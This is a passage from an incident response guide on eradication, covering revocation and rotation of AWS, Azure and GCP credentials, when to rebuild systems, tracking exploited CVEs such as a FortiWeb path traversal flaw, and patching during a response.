Personal Access Tokens (PATs) and similar long-lived credentials are tied to individual user identities and provide programmatic access to platforms and services. Unlike session tokens that expire relatively quickly, PATs often remain valid for months or years, providing persistent access that survives password resets. Common examples include GitHub and GitLab personal access tokens, AWS access keys associated with IAM users, Azure user credentials, and Platform-as-a-Service (PaaS) tokens from vendors like Heroku, Replit, and Render.

Attackers who obtain these credentials from compromised developer workstations or configuration files can access resources as the compromised user without triggering re-authentication. These access paths often have broad permissions, making them attractive for continued access to the environment. Revoke all personal access tokens associated with compromised user accounts. Most platforms provide an interface to list and revoke tokens. For example, GitHub users can review tokens under Settings | Developer settings | Personal access tokens. For AWS IAM users, list and delete access keys associated with compromised accounts, as shown in Listing 97.

Listing 97 | Revoking AWS IAM User Access Keys

$ aws iam list-access-keys --user-name gmurphy
{
"AccessKeyMetadata": [
{
"UserName": "gmurphy",
"AccessKeyId": "AKIA_DUMMY_SAMPLE_KEY_03",
"Status": "Active",
"CreateDate": "2025-12-02T20:30:56+00:00"
},
{
"UserName": "gmurphy",
"AccessKeyId": "AKIA_DUMMY_SAMPLE_KEY_04",
"Status": "Active",
"CreateDate": "2025-12-02T20:30:54+00:00"
}
]
}
$ aws iam delete-access-key --user-name gmurphy --access-key-id AKIA_DUMMY_SAMPLE_KEY_03
$ aws iam delete-access-key --user-name gmurphy --access-key-id AKIA_DUMMY_SAMPLE_KEY_04
$ aws iam list-access-keys --user-name gmurphy
{
"AccessKeyMetadata": [] 1
}
1 Confirms that all access keys have been deleted.
Table 30 provides equivalent commands for revoking cloud credentials across providers.

Table 30 | Cloud Credential Revocation Quick Reference

List credentials for a principal
AWS aws iam list-access-keys --user-name <user>
Azure az ad sp credential list --id <service-principal-id>
GCP gcloud iam service-accounts keys list --iam-account=<email>
Revoke or delete credentials
AWS aws iam delete-access-key --user-name <user> --access-key-id <key-id>
Azure az ad sp credential delete --id <service-principal-id> --key-id <key-id>
GCP gcloud iam service-accounts keys delete <key-id> --iam-account=<email>

Generate new tokens only after eradication is complete and the account is confirmed to be secure. Browser-stored credentials present a particular challenge. Browsers maintain password managers, authentication cookies, and session tokens that attackers can extract and use on other systems. Clear browser profiles on compromised systems and consider requiring password changes for accounts whose credentials were saved in affected browsers.

API Keys and Service Credentials

API keys and service credentials provide programmatic access to applications and services without being tied to a specific user identity. These shared credentials are used for application-to-application communication, webhook authentication, and service integrations. Because they are not associated with individual users, they often have broad access and may not be subject to the same lifecycle management as user credentials.

Common examples include application API keys for SaaS platforms, webhook authentication secrets, database connection strings, service-to-service authentication tokens, and third-party integration credentials. Azure service principals and GCP service account keys also fall into this category when used for application authentication rather than individual user access.

Rotate all potentially compromised API keys through the appropriate management interface. For Azure service principals:

Listing 98 | Rotating Azure Service Principal Credentials

PS C:\> Get-AzADSpCredential -ObjectId "2f91a3be-9c3c-4f6b-9cf7-1fb2e6e37ad2" 1
CustomKeyIdentifier :
EndDate            : 12/02/2026 05:41:17 PM
KeyId              : 3c8fcd5b-2c1d-4a96-90c9-5d9cd8f8ea21
StartDate          : 12/02/2025 05:41:17 PM
PS C:\> New-AzADSpCredential -ObjectId "2f91a3be-9c3c-4f6b-9cf7-1fb2e6e37ad2"
CustomKeyIdentifier :
EndDate            : 12/02/2027 05:44:02 PM
KeyId              : 9e5a7e8b-52af-4fc0-a2d3-cc91e0c6fa81
StartDate          : 12/02/2026 05:44:02 PM
SecretText         : tZp4K9Q~F8r1VdM2pJ7wHqL6xU3sN0Bg
PS C:\> Remove-AzADSpCredential -ObjectId "2f91a3be-9c3c-4f6b-9cf7-1fb2e6e37ad2" -KeyId
"3c8fcd5b-2c1d-4a96-90c9-5d9cd8f8ea21"
PS C:\>
1 Replace the UUID in this example with the pertinent service principal ObjectId.
Delete old keys only after new keys are deployed and validated in all dependent systems. Coordinate with
application teams to update configurations before deleting old credentials to avoid service interruption.

Targeted Removal vs. System Rebuild

Targeted artifact removal works well for straightforward compromises where responders can confidently enumerate all attacker artifacts. However, sophisticated attacks may benefit from a different approach: rebuilding systems from known-good sources rather than attempting to clean them in place. Rebuilding provides greater confidence in complete eradication, but at the cost of more time and planning than targeted removal.

In some incidents, rebuilding may be a faster, less-expensive option for eradication than targeted removal techniques. Consider the investigation outcome, system criticality, and available resources when choosing between these approaches.

The choice between targeted removal and a full rebuild depends on three important factors:

• Severity of compromise : Rootkits, kernel-mode malware, or firmware compromises require complete rebuilds because these threats operate below the level where standard eradication tools can reach.

Less-severe compromises may be feasible to clean in place.

• System criticality: Production systems require careful coordination to minimize service interruptions, affecting decision makers' downtime tolerance.

• Availability of clean sources : Backups and gold images should be available and verified to be clean insights gathered from the investigation to inform remediation efforts.

This section covers strategies for vulnerability remediation during eradication, including patch management, addressing unpatchable systems, broader vulnerability assessment, and strengthening security controls. During this activity, focusing efforts on the exploited vulnerabilities that led to the incident is important. Considering other vulnerabilities in the environment is valuable, but should not distract from remediating the root cause of the compromise.

Identifying Exploited Vulnerabilities

It is important to ensure that the response effort focuses on addressing the right vulnerabilities. Using the evidence collected during the investigation, including root cause analysis, identify the vulnerabilities or weaknesses that led to the incident. Prioritize vulnerabilities confirmed to have been exploited by the attacker for remediation.

Vulnerabilities are associated with Common Vulnerabilities and Exposures (CVE) identifiers. Use CVE identifiers to track and reference vulnerabilities in documentation, and to access vendor guidance on patching or remediation advice. Vulnerability patching is not always straightforward or consistent: assess vulnerabilities in the context of the organization’s specific environment and software versions. When available, refer to threat intelligence sources for additional context about the exploited vulnerability. While vendor advisories describe a vulnerability’s technical details, threat intelligence sources offer additional insight into how attackers exploit it in the wild. For example, resources, including CISA’s Known Exploited Vulnerabilities (KEV) catalog, provide additional context about actively exploited vulnerabilities, including binding operational directive timelines for federal agencies. [30] For example, consider the Fortinet FortiWeb vulnerability CVE-2025-64446: a path traversal vulnerability that allows an attacker to execute administrative commands (such as disabling firewall rules) via specially crafted HTTP requests. [31] The CVE information published for this vulnerability includes technical details, affected versions, and links to vendor patches, as shown in Figure 113. Further, the KEV entry for the CVE confirms that the vulnerability is actively exploited with concise remediation guidance, as shown in Figure 114.

Figure 113 | FortiWeb CVE-2025-64446 Advisory Excerpt

Figure 114 | FortiWeb KEV Catalog Entry

Cyber threat intelligence sources can also provide additional details not otherwise publicly linked to CVE or KEV reports. For example, one threat intelligence report on CVE-2025-64446 provides a link to a working exploit for this vulnerability. Using GitHub Copilot AI integration, analysts can obtain additional intelligence about the exploit’s functionality and IOCs, as shown in Figure 115 . This additional context can inform detection and remediation efforts during eradication.

Figure 115 | GitHub’s Copilot IOC Analysis for FortiWeb Exploit

When the attack vector is a configuration weakness rather than a software vulnerability, review the specific misconfiguration and the corrective action required. Configuration weaknesses may include overly permissive firewall rules, default credentials, exposed management interfaces, missing security headers on web applications, and more. Corrective efforts should focus on remediating the specific misconfiguration that enabled the attack, while also addressing operational practices to prevent such misconfigurations in the future.

Patch Management During Eradication

Apply security patches for exploited vulnerabilities as part of the eradication process. This is a straightforward recommendation that will be intuitive for organizations, but there are important considerations to ensure effective patching during incident response.

Test and Verify Before Broad Rollout: Every patch should be tested and verified prior to broad deployment. Develop a documented procedure for applying and verifying the patch, including expected outcomes and rollback steps if issues arise. Testing in a non-production environment helps identify compatibility issues before they affect critical systems.

Track Patch Status with Inventory Management : Use inventory management to ensure that all systems requiring remediation receive patches. Technology platforms such as configuration management databases

(CMDBs) or vulnerability scanners can help automate this documentation process. For organizations without these tools, manual spreadsheets or other tracking mechanisms (simple lists, tickets, etc.) can provide visibility into patch status across the environment. The goal is to maintain a clear record of which systems have been patched and which still require remediation.

Balance Change Management with Speed : Use change management processes where possible, but many organizations will benefit from prioritizing speed and risk reduction during incident response. A vulnerability actively exploited against the organization poses an immediate risk that often justifies expedited patching. Coordinate with decision makers to establish an appropriate risk tolerance for bypassing standard change windows, and ensure the prepare activity has already identified who holds the
